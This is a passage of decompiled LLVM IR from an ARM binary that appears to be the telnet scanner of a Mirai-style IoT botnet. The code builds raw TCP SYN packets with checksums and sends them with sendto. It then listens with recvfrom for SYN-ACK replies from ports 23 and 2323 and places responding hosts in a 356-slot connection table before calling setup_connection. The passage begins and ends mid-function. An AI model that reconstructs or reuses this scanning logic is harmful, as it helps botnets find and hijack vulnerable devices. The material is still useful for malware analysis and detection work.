  store i16 0, i16* bitcast (i32* @global_var_21f78.189 to i16*), align 4
  store i32 ptrtoint (i32* @global_var_21f68.160 to i32), i32* @r1, align 4
  store i32 5120, i32* %r2.global-to-local, align 4
  store i32 20, i32* %r3.global-to-local, align 4
  %v5_ef9c = call i32 @checksum_tcpudp(i32 ptrtoint (i8** @global_var_21f54.157 to i32), i32 ptrtoint (i32* @global_var_21f68.160 to i32), i32 5120, i32 20)
  %v6_ef9c = trunc i32 %v5_ef9c to i16
  store i32 ptrtoint (i8** @global_var_21f54.157 to i32), i32* %r1.global-to-local, align 4
  %v2_efa8 = load i32, i32* @global_var_24a6c.155, align 4
  store i16 %v6_ef9c, i16* bitcast (i32* @global_var_21f78.189 to i16*), align 4
  store i32 2, i32* %stack_var_-96, align 4
  %v3_efd4 = load i16, i16* @global_var_21f6a.165, align 2
  %v4_efd4 = zext i16 %v3_efd4 to i32
  store i32 %v4_efd4, i32* @lr, align 4
  store i32 %v2_f5a8, i32* %ip.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 40, i32* %r2.global-to-local, align 4
  %v7_eff0 = call i32 @__libc_sendto(i32 %v2_efa8, i32 ptrtoint (i8** @global_var_21f54.157 to i32), i32 40, i32 16384, i32 %v2_10068, i32 16)
  %v3_eff4 = load i32, i32* %stack_var_-52, align 4
  %v1_eff8 = add i32 %v3_eff4, 1
  store i32 %v1_eff8, i32* %r3.global-to-local, align 4
  %v3_effc = icmp ugt i32 %v1_eff8, 483
  store i1 %v3_effc, i1* %cpsr_c.global-to-local, align 1
  %v8_effc = icmp eq i32 %v1_eff8, 484
  store i1 %v8_effc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_eff8, i32* %stack_var_-52, align 4
  %v5_f004 = icmp slt i32 %v1_eff8, 484
  br i1 %v5_f004, label %dec_label_pc_ed1c, label %dec_label_pc_f008

dec_label_pc_f008:                                ; preds = %bb407
  %v0_f008 = load i32, i32* @r4, align 4
  br label %dec_label_pc_f00c

dec_label_pc_f00c:                                ; preds = %dec_label_pc_ecf8, %dec_label_pc_f008
  %stack_var_-1880.1 = phi i32 [ %stack_var_-1880.0, %dec_label_pc_ecf8 ], [ %v0_f008, %dec_label_pc_f008 ]
  %v0_f00c = call i32 @__GI___errno_location()
  store i32 %v2_ecf0, i32* %r1.global-to-local, align 4
  store i32 %v1_f018, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  %v2_f028 = inttoptr i32 %v0_f00c to i32*
  br label %dec_label_pc_f020

dec_label_pc_f020:                                ; preds = %dec_label_pc_f0e4, %dec_label_pc_f0dc, %dec_label_pc_f0d4, %dec_label_pc_f0b0, %dec_label_pc_f0a0, %dec_label_pc_f088, %dec_label_pc_f070, %dec_label_pc_f068, %dec_label_pc_f0cc, %dec_label_pc_f0c0, %dec_label_pc_f1a4, %dec_label_pc_f00c
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %v2_f028, align 4
  %v2_f034 = load i32, i32* @global_var_24a6c.155, align 4
  store i32 1514, i32* %r2.global-to-local, align 4
  store i32 %v2_ecf0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f044 = load i32, i32* %ip.global-to-local, align 4
  %v6_f04c = call i32 @__libc_recvfrom(i32 %v2_f034, i32 %v2_ecf0, i32 1514, i32 16384, i32 %v0_f044, i32 %v0_f044)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f050 = icmp eq i32 %v6_f04c, 0
  store i1 %v2_f050, i1* %cpsr_z.global-to-local, align 1
  %tmp408 = icmp slt i32 %v6_f04c, 1
  br i1 %tmp408, label %dec_label_pc_f1b4, label %dec_label_pc_f058

dec_label_pc_f058:                                ; preds = %dec_label_pc_f020
  store i32 %v0_f00c, i32* %ip.global-to-local, align 4
  %v2_f05c = load i32, i32* %v2_f028, align 4
  store i32 %v2_f05c, i32* %r3.global-to-local, align 4
  %v2_f060 = icmp ugt i32 %v2_f05c, 10
  store i1 %v2_f060, i1* %cpsr_c.global-to-local, align 1
  %v7_f060 = icmp eq i32 %v2_f05c, 11
  store i1 %v7_f060, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f060, label %dec_label_pc_f1b4, label %dec_label_pc_f068

dec_label_pc_f068:                                ; preds = %dec_label_pc_f058
  %v2_f068 = icmp ugt i32 %v6_f04c, 38
  store i1 %v2_f068, i1* %cpsr_c.global-to-local, align 1
  %v7_f068 = icmp eq i32 %v6_f04c, 39
  store i1 %v7_f068, i1* %cpsr_z.global-to-local, align 1
  %v2_f06c = xor i1 %v2_f068, true
  %v3_f06c = or i1 %v7_f068, %v2_f06c
  br i1 %v3_f06c, label %dec_label_pc_f020, label %dec_label_pc_f070

dec_label_pc_f070:                                ; preds = %dec_label_pc_f068
  store i32 %v2_ecf0, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_24a4c.59 to i32), i32* %r1.global-to-local, align 4
  %v3_f078 = load i32, i32* %v2_f078, align 4
  store i32 %v3_f078, i32* %r2.global-to-local, align 4
  %v2_f07c = load i32, i32* @global_var_24a4c.59, align 4
  store i32 %v2_f07c, i32* %r3.global-to-local, align 4
  %v3_f080 = icmp uge i32 %v3_f078, %v2_f07c
  store i1 %v3_f080, i1* %cpsr_c.global-to-local, align 1
  %v9_f080 = icmp eq i32 %v3_f078, %v2_f07c
  store i1 %v9_f080, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f080, label %dec_label_pc_f088, label %dec_label_pc_f020

dec_label_pc_f088:                                ; preds = %dec_label_pc_f070
  %v3_f088 = load i8, i8* %v2_f088, align 1
  %v4_f088 = zext i8 %v3_f088 to i32
  store i32 %v4_f088, i32* %r3.global-to-local, align 4
  %v2_f08c = icmp ugt i8 %v3_f088, 5
  store i1 %v2_f08c, i1* %cpsr_c.global-to-local, align 1
  %v7_f08c = icmp eq i8 %v3_f088, 6
  store i1 %v7_f08c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f08c, label %dec_label_pc_f094, label %dec_label_pc_f020

dec_label_pc_f094:                                ; preds = %dec_label_pc_f088
  %v0_f094 = load i32, i32* @r4, align 4
  %v1_f094 = inttoptr i32 %v0_f094 to i16*
  %v2_f094 = load i16, i16* %v1_f094, align 2
  %v3_f094 = zext i16 %v2_f094 to i32
  store i32 %v3_f094, i32* %ip.global-to-local, align 4
  %v2_f098 = icmp ugt i16 %v2_f094, 5887
  store i1 %v2_f098, i1* %cpsr_c.global-to-local, align 1
  %v7_f098 = icmp eq i16 %v2_f094, 5888
  store i1 %v7_f098, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f098, label %dec_label_pc_f0b0, label %dec_label_pc_f0a0

dec_label_pc_f0a0:                                ; preds = %dec_label_pc_f094
  store i32 4873, i32* %r3.global-to-local, align 4
  %v3_f0a8 = icmp ugt i16 %v2_f094, 4872
  store i1 %v3_f0a8, i1* %cpsr_c.global-to-local, align 1
  %v9_f0a8 = icmp eq i16 %v2_f094, 4873
  store i1 %v9_f0a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f0a8, label %dec_label_pc_f0b0, label %dec_label_pc_f020

dec_label_pc_f0b0:                                ; preds = %dec_label_pc_f0a0, %dec_label_pc_f094
  %v1_f0b0 = add i32 %v0_f094, 2
  %v2_f0b0 = inttoptr i32 %v1_f0b0 to i16*
  %v3_f0b0 = load i16, i16* %v2_f0b0, align 2
  %v4_f0b0 = zext i16 %v3_f0b0 to i32
  store i32 %v4_f0b0, i32* %r3.global-to-local, align 4
  store i32 %v4_ec54, i32* %r2.global-to-local, align 4
  %v3_f0b8 = icmp uge i32 %v4_f0b0, %v4_ec54
  store i1 %v3_f0b8, i1* %cpsr_c.global-to-local, align 1
  %v9_f0b8 = icmp eq i32 %v4_f0b0, %v4_ec54
  store i1 %v9_f0b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f0b8, label %dec_label_pc_f0c0, label %dec_label_pc_f020

dec_label_pc_f0c0:                                ; preds = %dec_label_pc_f0b0
  %v1_f0c0 = add i32 %v0_f094, 13
  %v2_f0c0 = inttoptr i32 %v1_f0c0 to i8*
  %v3_f0c0 = load i8, i8* %v2_f0c0, align 1
  %v4_f0c0 = zext i8 %v3_f0c0 to i32
  store i32 %v4_f0c0, i32* %r3.global-to-local, align 4
  %v1_f0c4 = and i32 %v4_f0c0, 2
  %v2_f0c4 = icmp eq i32 %v1_f0c4, 0
  store i1 %v2_f0c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f0c4, label %dec_label_pc_f020, label %dec_label_pc_f0cc

dec_label_pc_f0cc:                                ; preds = %dec_label_pc_f0c0
  %v1_f0cc = and i32 %v4_f0c0, 16
  %v2_f0cc = icmp eq i32 %v1_f0cc, 0
  store i1 %v2_f0cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f0cc, label %dec_label_pc_f020, label %dec_label_pc_f0d4

dec_label_pc_f0d4:                                ; preds = %dec_label_pc_f0cc
  %v1_f0d4 = and i32 %v4_f0c0, 4
  %v2_f0d4 = icmp eq i32 %v1_f0d4, 0
  store i1 %v2_f0d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f0d4, label %dec_label_pc_f0dc, label %dec_label_pc_f020

dec_label_pc_f0dc:                                ; preds = %dec_label_pc_f0d4
  %tmp = urem i8 %v3_f0c0, 2
  %v2_f0dc = icmp eq i8 %tmp, 0
  store i1 %v2_f0dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f0dc, label %dec_label_pc_f0e4, label %dec_label_pc_f020

dec_label_pc_f0e4:                                ; preds = %dec_label_pc_f0dc
  %v1_f0e4 = add i32 %v0_f094, 8
  %v2_f0e4 = inttoptr i32 %v1_f0e4 to i32*
  %v3_f0e4 = load i32, i32* %v2_f0e4, align 4
  %v5_f0fc = call i32 @llvm.bswap.i32(i32 %v3_f0e4)
  %v1_f100 = add i32 %v5_f0fc, -1
  store i32 %v1_f100, i32* %r2.global-to-local, align 4
  %v1_f104 = and i32 %v1_f100, 16711680
  %v3_f108 = udiv i32 %v1_f100, 16777216
  %v4_f110 = udiv i32 %v1_f104, 256
  %v5_f110 = or i32 %v4_f110, %v3_f108
  %v1_f10c = mul i32 %v1_f100, 256
  %v4_f114 = and i32 %v1_f10c, 16711680
  %v5_f114 = or i32 %v5_f110, %v4_f114
  store i32 %v5_f114, i32* %r3.global-to-local, align 4
  store i32 %v2_ecf0, i32* %r1.global-to-local, align 4
  %v3_f11c = load i32, i32* %v2_f11c, align 4
  store i32 %v3_f11c, i32* @lr, align 4
  %v5_f120 = call i32 @llvm.bswap.i32(i32 %v1_f100)
  store i32 %v5_f120, i32* %r3.global-to-local, align 4
  %v3_f124 = icmp uge i32 %v5_f120, %v3_f11c
  store i1 %v3_f124, i1* %cpsr_c.global-to-local, align 1
  %v9_f124 = icmp eq i32 %v5_f120, %v3_f11c
  store i1 %v9_f124, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_f124, label %dec_label_pc_f12c, label %dec_label_pc_f020

dec_label_pc_f12c:                                ; preds = %dec_label_pc_f0e4
  %v0_f12c = load i32, i32* @r5, align 4
  %v3_f12c = icmp ugt i32 %v0_f12c, 355
  store i1 %v3_f12c, i1* %cpsr_c.global-to-local, align 1
  %v8_f12c = icmp eq i32 %v0_f12c, 356
  store i1 %v8_f12c, i1* %cpsr_z.global-to-local, align 1
  %v6_f130 = icmp slt i32 %v0_f12c, 356
  br i1 %v6_f130, label %dec_label_pc_f134, label %dec_label_pc_f1b4

dec_label_pc_f134:                                ; preds = %dec_label_pc_f12c
  store i32 ptrtoint (i32* @global_var_24a68.153 to i32), i32* %r2.global-to-local, align 4
  %v2_f140 = load i32, i32* @global_var_24a68.153, align 4
  store i32 %v2_f140, i32* %r1.global-to-local, align 4
  %v3_f148 = mul i32 %v0_f12c, 388
  store i32 %v3_f148, i32* %r3.global-to-local, align 4
  %v2_f14c = add i32 %v2_f140, %v3_f148
  store i32 %v2_f14c, i32* @r0, align 4
  %v1_f150 = add i32 %v2_f14c, 12
  %v2_f150 = inttoptr i32 %v1_f150 to i32*
  %v3_f150 = load i32, i32* %v2_f150, align 4
  store i32 %v3_f150, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f154 = icmp eq i32 %v3_f150, 0
  store i1 %v2_f154, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f154, label %dec_label_pc_f19c, label %dec_label_pc_f178.preheader

dec_label_pc_f178.preheader:                      ; preds = %dec_label_pc_f134
  %v2_f158 = add i32 %v0_f12c, 1
  %v3_f164 = mul i32 %v2_f158, 97
  %v2_f168 = and i32 %v3_f164, 1073741824
  %v3_f168 = icmp ne i32 %v2_f168, 0
  store i1 %v3_f168, i1* %cpsr_c.global-to-local, align 1
  %v4_f168 = mul i32 %v2_f158, 388
  %v3_f16c = add i32 %v2_f140, %v4_f168
  store i32 %v3_f16c, i32* %r3.global-to-local, align 4
  store i32 %v0_f12c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f178

dec_label_pc_f178:                                ; preds = %dec_label_pc_f178.preheader, %dec_label_pc_f184
  %v0_f184 = phi i32 [ %v3_f16c, %dec_label_pc_f178.preheader ], [ %v1_f190, %dec_label_pc_f184 ]
  %v0_f178 = phi i32 [ %v0_f12c, %dec_label_pc_f178.preheader ], [ %v1_f178, %dec_label_pc_f184 ]
  %v1_f178 = add i32 %v0_f178, 1
  store i32 %v1_f178, i32* %r2.global-to-local, align 4
  %v7_f17c = icmp eq i32 %v1_f178, 356
  br i1 %v7_f17c, label %dec_label_pc_f1b4.loopexit, label %dec_label_pc_f184

dec_label_pc_f184:                                ; preds = %dec_label_pc_f178
  store i32 %v0_f184, i32* @r0, align 4
  %v1_f188 = add i32 %v0_f184, 12
  %v2_f188 = inttoptr i32 %v1_f188 to i32*
  %v3_f188 = load i32, i32* %v2_f188, align 4
  %v2_f18c = icmp eq i32 %v3_f188, 0
  %v1_f190 = add i32 %v0_f184, 388
  store i32 %v1_f190, i32* %r3.global-to-local, align 4
  br i1 %v2_f18c, label %dec_label_pc_f198, label %dec_label_pc_f178

dec_label_pc_f198:                                ; preds = %dec_label_pc_f184
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f178, i32* @r5, align 4
  br label %dec_label_pc_f19c

dec_label_pc_f19c:                                ; preds = %dec_label_pc_f134, %dec_label_pc_f198
  %v1_f1a4 = phi i32 [ %v2_f14c, %dec_label_pc_f134 ], [ %v0_f184, %dec_label_pc_f198 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f19c = icmp eq i32 %v1_f1a4, 0
  store i1 %v2_f19c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f19c, label %dec_label_pc_f1b4, label %dec_label_pc_f1a4

dec_label_pc_f1a4:                                ; preds = %dec_label_pc_f19c
  %v2_f1a4 = add i32 %v1_f1a4, 16
  %v3_f1a4 = inttoptr i32 %v2_f1a4 to i32*
  store i32 %v3_f11c, i32* %v3_f1a4, align 4
  %v0_f1a8 = load i32, i32* %ip.global-to-local, align 4
  %v1_f1a8 = trunc i32 %v0_f1a8 to i16
  %v2_f1a8 = load i32, i32* @r0, align 4
  %v3_f1a8 = add i32 %v2_f1a8, 20
  %v4_f1a8 = inttoptr i32 %v3_f1a8 to i16*
  store i16 %v1_f1a8, i16* %v4_f1a8, align 2
  %v0_f1ac = call i32 @setup_connection()
  br label %dec_label_pc_f020

dec_label_pc_f1b4.loopexit:                       ; preds = %dec_label_pc_f178
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f1b4

dec_label_pc_f1b4:                                ; preds = %dec_label_pc_f12c, %dec_label_pc_f058, %dec_label_pc_f020, %dec_label_pc_f19c, %dec_label_pc_f1b4.loopexit
  store i32 0, i32* %stack_var_-224, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1676, i32* %ip.global-to-local, align 4
  %v2_f1d4514 = load i32, i32* @sp, align 4
  %v3_f1d4515 = add i32 %v2_f1d4514, 1676
  %v4_f1d4516 = inttoptr i32 %v3_f1d4515 to i32*
  store i32 0, i32* %v4_f1d4516, align 4
  br label %dec_label_pc_f1c0.dec_label_pc_f1c0_crit_edge

dec_label_pc_f1c0.dec_label_pc_f1c0_crit_edge:    ; preds = %dec_label_pc_f1b4, %dec_label_pc_f1c0.dec_label_pc_f1c0_crit_edge
  %v0_f1c0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_f1c4 = add i32 %v0_f1c0.pre, 4
  store i32 %v1_f1c4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_f1cc = add i32 %v0_f1c0.pre, 1672
  store i32 %v1_f1cc, i32* %ip.global-to-local, align 4
  %v7_f1d0 = icmp eq i32 %v1_f1c4, 128
  %v2_f1d4 = load i32, i32* @sp, align 4
  %v3_f1d4 = add i32 %v2_f1d4, %v1_f1cc
  %v4_f1d4 = inttoptr i32 %v3_f1d4 to i32*
  store i32 0, i32* %v4_f1d4, align 4
  br i1 %v7_f1d0, label %dec_label_pc_f1dc, label %dec_label_pc_f1c0.dec_label_pc_f1c0_crit_edge

dec_label_pc_f1dc:                                ; preds = %dec_label_pc_f1c0.dec_label_pc_f1c0_crit_edge
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_f1dc = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_f1dc, i32* %stack_var_-352, align 4
  %v1_f1e8517 = add i32 %v0_f1dc, 8
  store i32 %v1_f1e8517, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_f1f0518 = add i32 %v0_f1dc, 1548
  store i32 %v1_f1f0518, i32* @lr, align 4
  %v7_f1f4519 = icmp eq i32 %v1_f1e8517, 128
  %v2_f1f8520 = load i32, i32* @sp, align 4
  %v3_f1f8521 = add i32 %v2_f1f8520, %v1_f1f0518
  %v4_f1f8522 = inttoptr i32 %v3_f1f8521 to i32*
  store i32 0, i32* %v4_f1f8522, align 4
  br i1 %v7_f1f4519, label %dec_label_pc_f200, label %dec_label_pc_f1e4.dec_label_pc_f1e4_crit_edge

dec_label_pc_f1e4.dec_label_pc_f1e4_crit_edge:    ; preds = %dec_label_pc_f1dc, %dec_label_pc_f1e4.dec_label_pc_f1e4_crit_edge
  %v0_f1e4.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_f1e8 = add i32 %v0_f1e4.pre, 4
  store i32 %v1_f1e8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_f1f0 = add i32 %v0_f1e4.pre, 1544
  store i32 %v1_f1f0, i32* @lr, align 4
  %v7_f1f4 = icmp eq i32 %v1_f1e8, 128
  %v2_f1f8 = load i32, i32* @sp, align 4
  %v3_f1f8 = add i32 %v2_f1f8, %v1_f1f0
  %v4_f1f8 = inttoptr i32 %v3_f1f8 to i32*
  store i32 0, i32* %v4_f1f8, align 4
  br i1 %v7_f1f4, label %dec_label_pc_f200, label %dec_label_pc_f1e4.dec_label_pc_f1e4_crit_edge

dec_label_pc_f200:                                ; preds = %dec_label_pc_f1e4.dec_label_pc_f1e4_crit_edge, %dec_label_pc_f1dc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v0_f200 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_f200, i32* @r5, align 4
  store i32 %v0_f200, i32* @r6, align 4
  store i32 %v0_f200, i32* %stack_var_-52, align 4
  br label %dec_label_pc_f25c

dec_label_pc_f210:                                ; preds = %dec_label_pc_f290
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_f27c, i1* %cpsr_z.global-to-local, align 1
  %v1_f300 = add i32 %v2_f274, 4
  %v2_f300 = inttoptr i32 %v1_f300 to i32*
  %v3_f300 = load i32, i32* %v2_f300, align 4
  br i1 %v7_f27c, label %dec_label_pc_f300, label %dec_label_pc_f218

dec_label_pc_f218:                                ; preds = %dec_label_pc_f210
  store i32 %v3_f300, i32* %ip.global-to-local, align 4
  %v3_f21c = udiv i32 %v3_f300, 32
  store i32 %v2_f30c, i32* %r1.global-to-local, align 4
  %v3_f224 = mul nuw nsw i32 %v3_f21c, 4
  %v2_f228 = add i32 %v3_f224, %v2_f30c
  store i32 %v2_f228, i32* %r3.global-to-local, align 4
  %v1_f22c = add i32 %v2_f228, -184
  %v2_f22c = inttoptr i32 %v1_f22c to i32*
  %v3_f22c = load i32, i32* %v2_f22c, align 4
  %v1_f230 = urem i32 %v3_f300, 32
  store i32 1, i32* %r1.global-to-local, align 4
  %v7_f238 = shl i32 1, %v1_f230
  %v8_f238 = or i32 %v3_f22c, %v7_f238
  store i32 %v8_f238, i32* %r2.global-to-local, align 4
  store i32 %v8_f238, i32* %v2_f22c, align 4
  %v0_f240 = load i32, i32* @r6, align 4
  %v1_f240 = load i32, i32* %ip.global-to-local, align 4
  %v3_f240 = icmp uge i32 %v0_f240, %v1_f240
  store i1 %v3_f240, i1* %cpsr_c.global-to-local, align 1
  %v9_f240 = icmp eq i32 %v0_f240, %v1_f240
  store i1 %v9_f240, i1* %cpsr_z.global-to-local, align 1
  %v5_f244 = icmp slt i32 %v0_f240, %v1_f240
  br i1 %v5_f244, label %bb409, label %bb410

bb409:                                            ; preds = %dec_label_pc_f218
  store i32 %v1_f240, i32* @r6, align 4
  br label %bb410

bb410:                                            ; preds = %.thread76, %bb416, %bb414, %bb418, %dec_label_pc_f2f4, %dec_label_pc_f218, %bb409
  %v3_f248 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_f248, i32* %r3.global-to-local, align 4
  %v1_f24c = add i32 %v3_f248, 1
  store i32 %v1_f24c, i32* %r2.global-to-local, align 4
  %v3_f250 = icmp ugt i32 %v1_f24c, 355
  store i1 %v3_f250, i1* %cpsr_c.global-to-local, align 1
  %v8_f250 = icmp eq i32 %v1_f24c, 356
  store i1 %v8_f250, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_f24c, i32* %stack_var_-52, align 4
  %v6_f258 = icmp slt i32 %v1_f24c, 356
  br i1 %v6_f258, label %dec_label_pc_f25c, label %dec_label_pc_f330

dec_label_pc_f25c:                                ; preds = %bb410, %dec_label_pc_f200
  %v1_f268 = phi i32 [ %v1_f24c, %bb410 ], [ %v0_f200, %dec_label_pc_f200 ]
  store i32 ptrtoint (i32* @global_var_24a68.153 to i32), i32* @r1, align 4
  %v2_f26c = load i32, i32* @global_var_24a68.153, align 4
  store i32 %v2_f26c, i32* %r2.global-to-local, align 4
  %v3_f270 = mul i32 %v1_f268, 388
  store i32 %v3_f270, i32* %r3.global-to-local, align 4
  %v2_f274 = add i32 %v2_f26c, %v3_f270
  store i32 %v2_f274, i32* @r4, align 4
  %v1_f278 = add i32 %v2_f274, 12
  %v2_f278 = inttoptr i32 %v1_f278 to i32*
  %v3_f278 = load i32, i32* %v2_f278, align 4
  store i32 %v3_f278, i32* %ip.global-to-local, align 4
  %v2_f27c = icmp ne i32 %v3_f278, 0
  store i1 %v2_f27c, i1* %cpsr_c.global-to-local, align 1
  %v7_f27c = icmp eq i32 %v3_f278, 1
  store i1 %v7_f27c, i1* %cpsr_z.global-to-local, align 1
  %v2_f280 = xor i1 %v2_f27c, true
  %v3_f280 = or i1 %v7_f27c, %v2_f280
  br i1 %v3_f280, label %bb411, label %bb412

bb411:                                            ; preds = %dec_label_pc_f25c
  store i32 5, i32* @r1, align 4
  br label %bb412

bb412:                                            ; preds = %dec_label_pc_f25c, %bb411
  %v1_f2a0215 = phi i32 [ ptrtoint (i32* @global_var_24a68.153 to i32), %dec_label_pc_f25c ], [ 5, %bb411 ]
  %v2_f284 = xor i1 %v7_f27c, true
  %v3_f284 = and i1 %v2_f27c, %v2_f284
  br i1 %v3_f284, label %bb413, label %bb414

bb413:                                            ; preds = %bb412
  store i32 30, i32* @r1, align 4
  br label %bb414

bb414:                                            ; preds = %bb412, %bb413
  %v1_f2a0 = phi i32 [ %v1_f2a0215, %bb412 ], [ 30, %bb413 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f288 = icmp eq i32 %v3_f278, 0
  store i1 %v2_f288, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f288, label %bb410, label %dec_label_pc_f290

dec_label_pc_f290:                                ; preds = %bb414
  store i32 ptrtoint (i32* @global_var_21f84.142 to i32), i32* %r2.global-to-local, align 4
  %v2_f294 = load i32, i32* @global_var_21f84.142, align 4
  store i32 %v2_f294, i32* %r3.global-to-local, align 4
  %v1_f298 = add i32 %v2_f274, 8
  %v2_f298 = inttoptr i32 %v1_f298 to i32*
  %v3_f298 = load i32, i32* %v2_f298, align 4
  store i32 %v3_f298, i32* %r2.global-to-local, align 4
  %v2_f29c = sub i32 %v2_f294, %v3_f298
  store i32 %v2_f29c, i32* %r3.global-to-local, align 4
  %v3_f2a0 = icmp uge i32 %v2_f29c, %v1_f2a0
  store i1 %v3_f2a0, i1* %cpsr_c.global-to-local, align 1
  %v9_f2a0 = icmp eq i32 %v2_f29c, %v1_f2a0
  store i1 %v9_f2a0, i1* %cpsr_z.global-to-local, align 1
  %v2_f2a4 = xor i1 %v3_f2a0, true
  %v3_f2a4 = or i1 %v9_f2a0, %v2_f2a4
  br i1 %v3_f2a4, label %dec_label_pc_f210, label %dec_label_pc_f2a8

dec_label_pc_f2a8:                                ; preds = %dec_label_pc_f290
  %v1_f2a8 = add i32 %v2_f274, 4
  %v2_f2a8 = inttoptr i32 %v1_f2a8 to i32*
  %v3_f2a8 = load i32, i32* %v2_f2a8, align 4
  %v1_f2ac = call i32 @__GI___libc_close(i32 %v3_f2a8)
  %v0_f2b0 = load i32, i32* @r4, align 4
  %v1_f2b0 = add i32 %v0_f2b0, 12
  %v2_f2b0 = inttoptr i32 %v1_f2b0 to i32*
  %v3_f2b0 = load i32, i32* %v2_f2b0, align 4
  store i32 %v3_f2b0, i32* %r3.global-to-local, align 4
  %v2_f2b4 = icmp ugt i32 %v3_f2b0, 1
  store i1 %v2_f2b4, i1* %cpsr_c.global-to-local, align 1
  %v7_f2b4 = icmp eq i32 %v3_f2b0, 2
  store i1 %v7_f2b4, i1* %cpsr_z.global-to-local, align 1
  %v2_f2b8 = xor i1 %v2_f2b4, true
  %v3_f2b8 = or i1 %v7_f2b4, %v2_f2b8
  br i1 %v3_f2b8, label %bb415, label %.thread300

.thread300:                                       ; preds = %dec_label_pc_f2a8
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_f2c0297301 = add i32 %v0_f2b0, 4
  %v3_f2c0298302 = inttoptr i32 %v2_f2c0297301 to i32*
  store i32 -1, i32* %v3_f2c0298302, align 4
  br label %bb416

bb415:                                            ; preds = %dec_label_pc_f2a8
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_f2c0294 = add i32 %v0_f2b0, 4
  %v3_f2c0295 = inttoptr i32 %v2_f2c0294 to i32*
  store i32 -1, i32* %v3_f2c0295, align 4
  %v4_f2c4 = load i32, i32* %r3.global-to-local, align 4
  %v5_f2c4 = load i32, i32* @r4, align 4
  %v6_f2c4 = add i32 %v5_f2c4, 12
  %v7_f2c4 = inttoptr i32 %v6_f2c4 to i32*
  store i32 %v4_f2c4, i32* %v7_f2c4, align 4
  %v4_f2c8 = load i32, i32* %r3.global-to-local, align 4
  %v5_f2c8 = trunc i32 %v4_f2c8 to i8
  %v6_f2c8 = load i32, i32* @r4, align 4
  %v7_f2c8 = add i32 %v6_f2c8, 384
  %v8_f2c8 = inttoptr i32 %v7_f2c8 to i8*
  store i8 %v5_f2c8, i8* %v8_f2c8, align 1
  %v0_f2cc.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_f2cc.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb416

bb416:                                            ; preds = %.thread300, %bb415
  %v1_f2cc = phi i1 [ %v1_f2cc.pre, %bb415 ], [ %v2_f2b4, %.thread300 ]
  %v0_f2cc = phi i1 [ %v0_f2cc.pre, %bb415 ], [ false, %.thread300 ]
  %v2_f2cc = xor i1 %v1_f2cc, true
  %v3_f2cc = or i1 %v0_f2cc, %v2_f2cc
  br i1 %v3_f2cc, label %bb410, label %dec_label_pc_f2d0

dec_label_pc_f2d0:                                ; preds = %bb416
  %v0_f2d0 = load i32, i32* @r4, align 4
  %v1_f2d0 = add i32 %v0_f2d0, 384
  %v2_f2d0 = inttoptr i32 %v1_f2d0 to i8*
  %v3_f2d0 = load i8, i8* %v2_f2d0, align 1
  %v4_f2d0 = zext i8 %v3_f2d0 to i32
  %v1_f2d4 = add nuw nsw i32 %v4_f2d0, 1
  %v1_f2d8 = urem i32 %v1_f2d4, 256
  store i32 %v1_f2d8, i32* %r3.global-to-local, align 4
  %v2_f2dc = icmp ugt i32 %v1_f2d8, 9
  store i1 %v2_f2dc, i1* %cpsr_c.global-to-local, align 1
  %v7_f2dc = icmp eq i32 %v1_f2d8, 10
  store i1 %v7_f2dc, i1* %cpsr_z.global-to-local, align 1
  %v1_f2e0 = trunc i32 %v1_f2d4 to i8
  store i8 %v1_f2e0, i8* %v2_f2d0, align 1
  %v0_f2e4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_f2e4, label %.thread76, label %dec_label_pc_f2f4

.thread76:                                        ; preds = %dec_label_pc_f2d0
